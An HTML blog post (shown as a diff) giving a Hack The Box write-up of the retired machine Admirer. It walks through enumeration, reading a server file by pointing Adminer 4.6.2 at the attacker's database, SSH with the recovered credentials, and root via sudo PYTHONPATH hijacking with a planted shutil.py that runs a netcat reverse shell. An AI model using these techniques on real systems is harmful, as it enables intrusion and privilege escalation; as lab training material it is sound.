@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="Daniel Cano">
+<meta name="description" content="Writeup about the Hackthebox retired machine Admirer 10.10.10.187">
+<meta name="keywords" content="hacking, technology, programming">
+<meta name="referrer" content="always">
+<meta property="og:description" content="Writeup about the Hackthebox retired machine Admirer 10.10.10.187">
+<meta property="og:title" content="Writeup Hackthebox HTB Admirer">
+<meta property="og:url" content="https://u915.net/posts/2020/09/writeup-hackthebox-htb-admirer/">
+<meta property="og:image" content="https://u915.net/images/logo_small.png" />
+<title>Writeup Hackthebox HTB Admirer - u915</title>
+<link rel="stylesheet" type="text/css" href="/css/main.css">
+<link rel="icon" href="/images/favicon.png" type="image/x-icon">
+<link rel="shortcut icon" href="/images/favicon_48_48.png">
+</head>
+<body>
+<header>
+  <div class="blog-header">
+    <h1><a href="https://u915.net/">u915</a></h1>
+    <div><a href="https://u915.net/"><img src="/images/logo_small.png" class="bloglogo"></img></a></div><h4>Daniel Cano Merchán - Hacking &amp; Tech</h4>
+  </div>
+  <nav><a href="/">Index</a><a href="/posts/">Posts</a><a href="/tags/">Tags</a><a href="/hacking-tools/">Tools</a><a href="/about/">About</a></nav>
+</header>
+<main>
+  <article>
+    <div class="title">
+  <h1>Writeup Hackthebox HTB Admirer</h1>
+  </div>
+<div class="meta">
+  <div class="meta-bar">2020-09-26
+  <span><a href="https://u915.net/tags/hacking/">#Hacking</a></span>
+      <span><a href="https://u915.net/tags/hackthebox/">#Hackthebox</a></span>
+      <span><a href="https://u915.net/tags/pentesting/">#Pentesting</a></span>
+      </div>
+  </div>
+<div class="content">
+  <h2 id="0---basic-info">0 - Basic info</h2>
+<p>OS: Linux</p>
+<p>IP: 10.10.10.187</p>
+<h2 id="1---reconnaissance-and-enumeration">1 - Reconnaissance and enumeration</h2>
+<pre><code>sudo nmap -sS -sV -sC -O 10.10.10.187
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-30 20:15 CEST
+Nmap scan report for 10.10.10.187
+Host is up (0.049s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/admin-dir
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Admirer
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=7/30%OT=21%CT=1%CU=39042%PV=Y%DS=2%DC=I%G=Y%TM=5F230E5
+OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=8)OPS
+OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A                                                                                                                                                                
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R                                                                                                                                                                
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F                                                                                                                                                                
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%                                                                                                                                                                
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD                                                                                                                                                                
+OS:=S)                                                                                                                                                                                                                                     
+	                                                                                                                                                                                                                                   
+Network Distance: 2 hops                                                                                                                                                                                                                   
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                                             
+	                                                                                                                                                                                                                                   
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                                      
+Nmap done: 1 IP address (1 host up) scanned in 21.77 seconds
+</code></pre>
+<p>Nothing useful on the port 80 just a static web site with images but the port 21 is interesting, FTP with vsftpd 3.0.3, searching exploits:</p>
+<pre><code>searchsploit vsftpd
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                           |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                                                                           | linux/dos/5814.pl
+vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                                                                           | windows/dos/31818.sh
+vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                                                                           | windows/dos/31819.pl
+vsftpd 2.3.2 - Denial of Service                                                                                                                                                                         | linux/dos/16270.c
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                                                   | unix/remote/17491.rb
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>Nothing useful</p>
+<p>robots.txt has disabled the directory <em>/admin-dir</em> , fuzzing with Gobuster, inside there are the files <em>contacts.txt</em> and <em>credentials.txt</em>:</p>
+<pre><code>##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+
+# Amy
+Email: a.bialik@admirer.htb
+
+# Leonard
+Email: l.galecki@admirer.htb
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+
+# Bernadette
+Email: b.rauch@admirer.htb
+
+[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+</code></pre>
+<p>Great, a lot of plain text passwords. Using the FTP account:</p>
+<p><img src="/images/posts/htb_admirer_1.png" alt="alt text" title="inside FTP"></p>
+<p>Inside there are a <em>dump.sql</em> and <em>html.tar.gz</em> appears to be backups files.</p>
+<p>Looking inside <em>db_admin.php</em>:</p>
+<pre><code>$username = &quot;waldo&quot;;
+$password = &quot;]F7jLHw:*G&gt;UPrTo}~A&quot;d6b&quot;;
+</code></pre>
+<p>Sadly not working via ssh&hellip;</p>
+<p>Also in the backup there is a file called, <em>admin_tasks.php</em>, open to internet:</p>
+<pre><code>&lt;html&gt;                                                                                                                                                                             
+&lt;head&gt;                  
+  &lt;title&gt;Administrative Tasks&lt;/title&gt;                                                         
+&lt;/head&gt;                                                                                       
+&lt;body&gt;                                     
+  &lt;h3&gt;Admin Tasks Web Interface (v0.01 beta)&lt;/h3&gt;         
+  &lt;?php                                                                                       
+  // Web Interface to the admin_tasks script                                                  
+  //                                                                                          
+  if(isset($_REQUEST['task']))
+  {                      
+    $task = $_REQUEST['task'];
+    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
+       $task == '5' || $task == '6' || $task == '7')
+    {                                                                                                                                                                                       
+      /*********************************************************************************** 
+     Available options:
+       1) View system uptime
+       2) View logged in users
+       3) View crontab (current user only)
+       4) Backup passwd file (not working)
+       5) Backup shadow file (not working)
+       6) Backup web data (not working)
+       7) Backup database (not working)
+NOTE: Options 4-7 are currently NOT working because they need root privileges.
+             I'm leaving them in the valid tasks in case I figure out a way
+             to securely run code as root from a PHP page.
+      ************************************************************************************/
+      echo str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, shell_exec(&quot;/opt/scripts/admin_tasks.sh $task 2&gt;&amp;1&quot;));
+    }
+    else
+    {
+      echo(&quot;Invalid task.&quot;);
+    }
+  } 
+  ?&gt;&lt;p&gt;
+  &lt;h4&gt;Select task:&lt;/p&gt;
+  &lt;form method=&quot;POST&quot;&gt;
+    &lt;select name=&quot;task&quot;&gt;
+  &lt;select name=&quot;task&quot;&gt;
+      &lt;option value=1&gt;View system uptime&lt;/option&gt;
+      &lt;option value=2&gt;View logged in users&lt;/option&gt;
+      &lt;option value=3&gt;View crontab&lt;/option&gt;
+      &lt;option value=4 disabled&gt;Backup passwd file&lt;/option&gt;
+      &lt;option value=5 disabled&gt;Backup shadow file&lt;/option&gt;
+      &lt;option value=6 disabled&gt;Backup web data&lt;/option&gt;
+      &lt;option value=7 disabled&gt;Backup database&lt;/option&gt;
+    &lt;/select&gt;
+    &lt;input type=&quot;submit&quot;&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p><img src="/images/posts/htb_admirer_2.png" alt="alt text" title="Admin tasks Admirer"></p>
+<p>Obviously this file catched my attention because appears to do administrative things and really juicy tasks like backing the passwd and shadow files&hellip;</p>
+<p>I wasted time here trying to exploit the tool without luck so i supposed was a rabbit hole.</p>
+<p>Trying to fuzz again the path of the tool <em>administrative_tasks.php</em> looking for similar files, because i got a backup of the site maybe the admin is using the path for an upgraded tool or similar scripts:</p>
+<pre><code>wfuzz -c -w /usr/share/wordlists/dirb/big.txt -z list,php-txt-html --hc 403,404 -t 100 -u http://10.10.10.187/utility-scripts/FUZZ.FUZ2Z
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.187/utility-scripts/FUZZ.FUZ2Z
+Total requests: 61407
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                                                                                                                   
+===================================================================
+
+000005617:   200        51 L     235 W    4158 Ch     &quot;adminer - php&quot; 
+</code></pre>
+<p>Good, maybe the right path, adminer is a tool similar to phpMyAdmin, for database management and is similar to the box name.</p>
+<p>And I got the DB user/pass found on <em>db_admin.php</em></p>
+<p><img src="/images/posts/htb_admirer_3.png" alt="alt text" title="Adminer tool HTB"></p>
+<h2 id="2---vulnerability-identification">2 - Vulnerability Identification</h2>
+<p>Credentials did not work, but the version is easy to find <em>4.6.2</em>.</p>
+<p>Searching vulnerabilities for the adminer version 4.6.2:</p>
+<p><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">serious-vulnerability-discovered-in-adminer-tool</a></p>
+<p><a href="https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f">adminer-script-results-to-pwning-server-private-bug-bounty-program</a></p>
+<h2 id="3---exploit">3 - Exploit</h2>
+<p>So the flaw is Adminer is not managing correctly remote connections because is allowed to dump remote system data to our local database.</p>
+<h3 id="local-database">Local database:</h3>
+<pre><code>sudo mysql -u root -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 39
+Server version: 10.3.22-MariaDB-1 Debian buildd-unstable
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]&gt; create database exploit;
+Query OK, 1 row affected (0.000 sec)
+
+MariaDB [(none)]&gt; use exploit;
+Database changed
+
+MariaDB [exploit]&gt; CREATE DATABASE dummy;
+Query OK, 1 row affected (0.001 sec)
+
+MariaDB [exploit]&gt; use dummy;
+Database changed
+MariaDB [dummy]&gt; CREATE USER 'dummy'@'%' IDENTIFIED BY 'dummy_admirer';
+Query OK, 0 rows affected (0.001 sec)
+
+MariaDB [dummy]&gt; create table dummy(data VARCHAR(255));
+Query OK, 0 rows affected (0.009 sec)
+
+MariaDB [dummy]&gt; GRANT ALL PRIVILEGES ON * . * TO 'dummy'@'%';
+Query OK, 0 rows affected (0.001 sec)
+
+MariaDB [dummy]&gt; FLUSH PRIVILEGES;
+Query OK, 0 rows affected (0.001 sec)
+
+MariaDB [dummy]&gt; exit
+Bye
+</code></pre>
+<p>Next step is to open the database to internet:</p>
+<pre><code>sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf
+</code></pre>
+<p>Changing the bind-address to 0.0.0.0 to be open:</p>
+<pre><code>bind-address = 0.0.0.0 
+</code></pre>
+<p>Restart the database service to apply the changes:</p>
+<pre><code>sudo systemctl restart mysql
+</code></pre>
+<h3 id="configuring-adminer-to-use-my-local-database">Configuring Adminer to use my local database:</h3>
+<p>In the login panel using:</p>
+<ul>
+<li>system: <em>mysql</em></li>
+<li>username: dummy</li>
+<li>server: local htb vpn ip</li>
+</ul>
+<h3 id="dumping-data">Dumping data:</h3>
+<p>Worked, inside Adminer the panel, the SQL Command editor</p>
+<p><img src="/images/posts/htb_admirer_4.png" alt="alt text" title="Adminer panel HTB"></p>
+<p>Next step is dumping the file <em>index.php</em>.</p>
+<p><em>Why index.php?</em> because i know there are credentials inside looking the old web backup i found on the FTP. The old credentials did not work so maybe the credentials changed.</p>
+<pre><code>load data local infile ‘/var/www/html/index.php’ into table dummy;
+</code></pre>
+<p><img src="/images/posts/htb_admirer_5.png" alt="alt text" title="dumping data to my local database"></p>
+<p>Worked, as i figured out before there are credentials inside and are different to the old ones.</p>
+<p><img src="/images/posts/htb_admirer_6.png" alt="alt text" title="Dumped data"></p>
+<pre><code>$username = &quot;waldo&quot;; 
+$password = &quot;&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;&quot;;
+</code></pre>
+<h3 id="machine-access-and-user-flag">Machine access and user flag</h3>
+<p>Testing the credentials via ssh:</p>
+<pre><code>ssh waldo@10.10.10.187
+
+waldo@10.10.10.187's password: 
+Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+</code></pre>
+<p>Great, i am in and i got a low privileged account.</p>
+<pre><code>waldo@admirer:~$ ls
+user.txt
+waldo@admirer:~$ cat user.txt 
+09XXXXXXXXXXXXXXXXX45
+</code></pre>
+<h2 id="4---post-exploitation-and-privilege-scalation">4 - Post-Exploitation and privilege scalation</h2>
+<p>Checking sudo permissions:</p>
+<pre><code>waldo@admirer:~$ sudo -l
+[sudo] password for waldo: 
+Matching Defaults entries for waldo on admirer:
+    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=alwaysUser waldo may run the following commands on admirer:
+    (ALL) SETENV: /opt/scripts/admin_tasks.sh
+</code></pre>
+<p>So sudo is available on <em>/opt/scripts/admin_tasks.sh</em>. Checking what is inside the path <em>/opt/scripts</em> and studying the files: <em>admin_tasks.php</em> and <em>backup.py</em></p>
+<pre><code>waldo@admirer:/opt/scripts$ ls -lrta
+total 16
+drwxr-xr-x 3 root root   4096 Nov 30  2019 ..
+-rwxr-xr-x 1 root admins 2613 Dec  2  2019 admin_tasks.sh
+-rwxr----- 1 root admins  198 Dec  2  2019 backup.py
+drwxr-xr-x 2 root admins 4096 Dec  2  2019 .
+</code></pre>
+<p>admin_tasks.sh, similar to the script previously found:</p>
+<pre><code>#!/bin/bashview_uptime()
+{
+    /usr/bin/uptime -p
+}view_users()
+{
+    /usr/bin/w
+}view_crontab()
+{
+    /usr/bin/crontab -l
+}backup_passwd()
+{
+    if [ &quot;$EUID&quot; -eq 0 ]
+    then
+    echo &quot;Backing up /etc/passwd to /var/backups/passwd.bak...&quot;
+    /bin/cp /etc/passwd /var/backups/passwd.bak
+    /bin/chown root:root /var/backups/passwd.bak
+    /bin/chmod 600 /var/backups/passwd.bak
+    echo &quot;Done.&quot;
+    else
+    echo &quot;Insufficient privileges to perform the selected operation.&quot;
+    fi
+}backup_shadow()
+{
+    if [ &quot;$EUID&quot; -eq 0 ]
+    then
+    echo &quot;Backing up /etc/shadow to /var/backups/shadow.bak...&quot;
+    /bin/cp /etc/shadow /var/backups/shadow.bak
+    /bin/chown root:shadow /var/backups/shadow.bak
+    /bin/chmod 600 /var/backups/shadow.bak
+    echo &quot;Done.&quot;
+    else
+   fi
+}backup_web()
+{
+    if [ &quot;$EUID&quot; -eq 0 ]
+    then
+    echo &quot;Running backup script in the background, it might take a while...&quot;
+    /opt/scripts/backup.py &amp;
+    else
+    echo &quot;Insufficient privileges to perform the selected operation.&quot;
+    fi
+}backup_db()
+{
+    if [ &quot;$EUID&quot; -eq 0 ]
+    then
+    echo &quot;Running mysqldump in the background, it may take a while...&quot;
+    #/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;
+    /usr/bin/mysqldump -u root admirerdb &gt; /var/backups/dump.sql &amp;
+    else
+    echo &quot;Insufficient privileges to perform the selected operation.&quot;
+    fi
+}# Non-interactive way, to be used by the web interface
+if [ $# -eq 1 ]
+then
+    option=$1
+    case $option in
+    1) view_uptime ;;
+    2) view_users ;;
+    3) view_crontab ;;
+    4) backup_passwd ;;
+    5) backup_shadow ;;
+    6) backup_web ;;
+    7) backup_db ;;
+
+    *) echo &quot;Unknown option.&quot; &gt;&amp;2
+    esacexit 0
+fi# Interactive way, to be called from the command line
+options=(&quot;View system uptime&quot;
+     &quot;View logged in users&quot;
+     &quot;View crontab&quot;
+     &quot;Backup passwd file&quot;
+     &quot;Backup shadow file&quot;
+     &quot;Backup web data&quot;
+     &quot;Backup DB&quot;
+     &quot;Quit&quot;)echo
+echo &quot;[[[ System Administration Menu ]]]&quot;
+PS3=&quot;Choose an option: &quot;
+COLUMNS=11
+select opt in &quot;${options[@]}&quot;; do
+    case $REPLY in
+    1) view_uptime ; break ;;
+    2) view_users ; break ;;
+    3) view_crontab ; break ;;
+    4) backup_passwd ; break ;;
+    5) backup_shadow ; break ;;
+    6) backup_web ; break ;;
+    7) backup_db ; break ;;
+    8) echo &quot;Bye!&quot; ; break ;;*) echo &quot;Unknown option.&quot; &gt;&amp;2
+    esac
+doneexit 0
+</code></pre>
+<p>After a while, i found interesting the function:</p>
+<pre><code>backup_web()
+{
+    if [ &quot;$EUID&quot; -eq 0 ]
+    then
+    echo &quot;Running backup script in the background, it might take a while...&quot;
+    /opt/scripts/backup.py &amp;
+[...]
+</code></pre>
+<p>So this script call the python script backup.py and waldo has sudo permissions on the .sh file, so finally the python script is executed with root permissions:</p>
+<p>Checking backup.py</p>
+<pre><code>waldo@admirer:/opt/scripts$ cat backup.py 
+
+#!/usr/bin/python3
+
+from shutil import make_archive
+
+src = '/var/www/html/'
+
+# old ftp directory, not used anymore
+#dst = '/srv/ftp/html'
+
+dst = '/var/backups/html'
+
+make_archive(dst, 'gztar', src)
+</code></pre>
+<p>After studying both files i put the effort on the library called &ldquo;shutil&rdquo;, because the python and bash scripts can not be modified.</p>
+<p>checking the PYTHONPATH:</p>
+<pre><code>waldo@admirer:/opt/scripts$ python -c 'import sys; print &quot;\n&quot;.join(sys.path)'
+
+/usr/lib/python2.7
+/usr/lib/python2.7/plat-x86_64-linux-gnu
+/usr/lib/python2.7/lib-tk
+/usr/lib/python2.7/lib-old
+/usr/lib/python2.7/lib-dynload
+/usr/local/lib/python2.7/dist-packages
+/usr/lib/python2.7/dist-packages
+</code></pre>
+<p>So the strategy is library/path hijacking.</p>
+<p>To do that, modifying the PYTHONPATH to use a <em>rogue</em> library forcing to use the library <em>shutil</em> with a custom script instead the original library on a different path.</p>
+<h3 id="creating-the-path-lib-inside-homewaldolib">Creating the path lib inside /home/waldo/lib</h3>
+<pre><code>waldo@admirer:~$ mkdir lib
+waldo@admirer:~$ cd lib/
+waldo@admirer:~/lib$ nano shutil.py
+waldo@admirer:~/lib$ sudo PYTHONPATH=/home/waldo/lib /opt/scripts/admin_tasks.sh
+</code></pre>
+<h3 id="custom-shutilpy">Custom shutil.py</h3>
+<p>Just a simple python script to make a reverse connection with netcat. So when the function backup_web() is fired the python script will be executed as root and will open a reverse connection to our machine.</p>
+<pre><code>waldo@admirer:~/lib$ cat shutil.py
+import os
+os.system(&quot;nc 10.10.14.11 1234 -e '/bin/sh'&quot;)
+</code></pre>
+<h3 id="setting-up-a-listener">Setting up a listener</h3>
+<p>On the pentest machine:</p>
+<pre><code>nc -lvp 1234
+</code></pre>
+<h3 id="executing-the-file-with-sudo">Executing the file with sudo</h3>
+<p>Using the option 6, Backup web data, to trigger the script:</p>
+<pre><code>[sudo] password for waldo: 
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 6
+Running backup script in the background, it might take a while...
+</code></pre>
+<h3 id="listening-incoming-connections">Listening incoming connections&hellip;</h3>
+<p>Worked !</p>
+<pre><code>id                                                                                                                                                                                                                                         
+uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                                                     
+cat /root/root.txt                                                                                                                                                                                                                         
+16XXXXXXXXXXXXXXXXXXXXXXX2e
+</code></pre>
+<p>Thanks for reading!</p>
+</div>
+
+  </article>
+</main>
+<footer>
+  <div>
+    <nav class="footer-menu"><a href="https://github.com/u915">GitHub</a><a href="https://www.linkedin.com/in/daniel-canomerchan">Linkedin</a><a href="/posts/index.xml">RSS</a><a href="/sitemap.xml">Sitemap</a></nav>
+    <div>© 2020 — u915 — <a href="/license/">License</a></div>
+  </div>
+</footer>
+</body>
+</html>
